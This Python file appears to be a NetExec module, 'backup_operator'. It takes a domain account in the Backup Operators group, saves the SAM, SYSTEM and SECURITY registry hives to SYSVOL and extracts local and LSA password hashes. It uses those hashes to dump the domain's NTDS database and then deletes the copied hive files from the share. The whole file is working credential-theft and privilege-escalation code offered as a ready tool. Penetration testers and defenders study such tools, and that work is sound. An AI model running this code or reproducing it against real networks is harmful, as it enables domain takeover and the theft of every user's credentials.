import contextlib
import re

from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import rrp
from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.helpers.rpc import NXCRPCConnection


class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.local_admin = None
        self.local_admin_hash = None
        self.machine_account = None
        self.machine_account_hash = None
        self.cleanup_user = None
        self.cleanup_hash = None

    def options(self, context, module_options):
        """NO OPTIONS"""

    def on_login(self, context, connection):
        connection.args.share = "SYSVOL"
        rand_suffix = gen_random_string(8)

        # enable remote registry
        context.log.display("Triggering RemoteRegistry to start through named pipe...")
        connection.trigger_winreg()
        dce = NXCRPCConnection(connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)

        try:
            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                hRootKey, subKey = self._strip_root_key(dce, hive)
                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
                context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                try:
                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
                    context.log.highlight(f"Saved {hive} to {outputFileName}")
                except Exception as e:
                    context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                    return
        except (Exception, KeyboardInterrupt) as e:
            context.log.fail(f"Unexpected error: {e}")
            return
        finally:
            with contextlib.suppress(Exception):
                dce.disconnect()

        # copy remote file to local
        log_path = f"{connection.output_filename}."
        for hive in ["SAM", "SECURITY", "SYSTEM"]:
            connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)

        # read local file
        try:
            def parse_sam(secret):
                context.log.highlight(secret)
                if not self.local_admin:
                    first_line = secret.strip().splitlines()[0]
                    fields = first_line.split(":")
                    if len(fields) >= 4:
                        self.local_admin = fields[0]
                        self.local_admin_hash = fields[3]

            def parse_lsa(secret_type, secret):
                context.log.highlight(secret)
                if self.machine_account:
                    return
                for line in secret.splitlines():
                    match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
                    if match:
                        self.machine_account_hash = match.group(1)
                        account_name = line.split(":", 1)[0].strip().split("\\")[-1]
                        # "$MACHINE.ACC" has no real name -> derive it from the connection.
                        self.machine_account = account_name if account_name.endswith("$") else f"{connection.hostname}$"
                        return

            local_operations = LocalOperations(log_path + "SYSTEM")
            boot_key = local_operations.getBootKey()
            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=parse_sam)
            sam_hashes.dump()
            sam_hashes.finish()

            LSA = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        except Exception as e:
            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")

        dump_creds = None
        for username, user_hash in [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)]:
            if self._try_dump_ntds(connection, context, username, user_hash):
                dump_creds = (username, user_hash)
                break

        if dump_creds:
            self.cleanup_user, self.cleanup_hash = self._extract_da_hash(connection.output_filename, context)
            if not self.cleanup_user or not self.cleanup_hash:
                self.cleanup_user, self.cleanup_hash = dump_creds

            self._perform_cleanup(connection, context, self.cleanup_user, self.cleanup_hash, rand_suffix)
        else:
            context.log.fail("Failed to obtain suitable credentials for NTDS dump or cleanup.")
            self._print_cleanup_warning(context, rand_suffix)

    def _try_dump_ntds(self, connection, context, username, user_hash):
        if not username or not user_hash:
            return False
        with contextlib.suppress(Exception):
            connection.conn.logoff()
        connection.create_conn_obj()
        if connection.hash_login(connection.domain, username, user_hash):
            try:
                context.log.display(f"Dumping NTDS using {username}...")
                connection.ntds()
                return True
            except Exception as e:
                context.log.fail(f"Fail to dump the NTDS with {username}: {e!s}")
        return False

    def _perform_cleanup(self, connection, context, username, user_hash, rand_suffix):
        if not username or not user_hash:
            self._print_cleanup_warning(context, rand_suffix)
            return
        context.log.display(f"Using {username} to clean up files...")
        with contextlib.suppress(Exception):
            connection.conn.logoff()
        connection.create_conn_obj()
        if connection.hash_login(connection.domain, username, user_hash):
            context.log.display(f"Cleaning dump with user {username} on domain {connection.domain}")
            hives = ["SAM", "SECURITY", "SYSTEM"]
            all_deleted = True
            for hive in hives:
                remote_name = f"{hive}_{rand_suffix}"
                try:
                    connection.conn.deleteFile("SYSVOL", remote_name)
                    context.log.debug(f"File {remote_name} deleted successfully via SMB.")
                except SessionError as e:
                    if "STATUS_NO_SUCH_FILE" in str(e):
                        context.log.debug(f"File {remote_name} already removed or not found.")
                        continue
                    if "STATUS_ACCESS_DENIED" in str(e):
                        context.log.debug(f"SMB deleteFile for {remote_name} got access denied. Attempting deletion via cmd execution...")
                        try:
                            connection.execute(f"del C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                            continue
                        except Exception as exec_err:
                            context.log.debug(f"Failed to delete {remote_name} via command execution: {exec_err}")
                    all_deleted = False
                    context.log.fail(f"Fail to remove the file {remote_name}: {e!s}")

            if all_deleted:
                double_check = True
                for hive in hives:
                    remote_name = f"{hive}_{rand_suffix}"
                    try:
                        if connection.conn.listPath("SYSVOL", remote_name):
                            double_check = False
                            context.log.fail(f"File {remote_name} still exists on C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                    except SessionError:
                        pass
                if double_check:
                    context.log.display("Successfully deleted dump files !")
                    return

        self._print_cleanup_warning(context, rand_suffix)

    def _extract_da_hash(self, output_filename, context):
        try:
            with open(f"{output_filename}.ntds") as f:
                fallback = None
                for line in f:
                    fields = line.strip().split(":")
                    if len(fields) < 4 or not fields[3]:
                        continue
                    da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
                    if fields[1] == "500":
                        return da_user, fields[3]
                    if fallback is None:
                        fallback = (da_user, fields[3])
                if fallback:
                    return fallback
        except Exception as e:
            context.log.debug(f"Failed to read NTDS file for cleanup: {e}")
        return None, None

    def _print_cleanup_warning(self, context, rand_suffix):
        context.log.fail(f"Files were not automatically deleted. Please clean up manually: C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")

    def _strip_root_key(self, dce, key_name):
        # Let's strip the root key
        key_name.split("\\")[0]
        sub_key = "\\".join(key_name.split("\\")[1:])
        ans = rrp.hOpenLocalMachine(dce)
        h_root_key = ans["phKey"]
        return h_root_key, sub_key
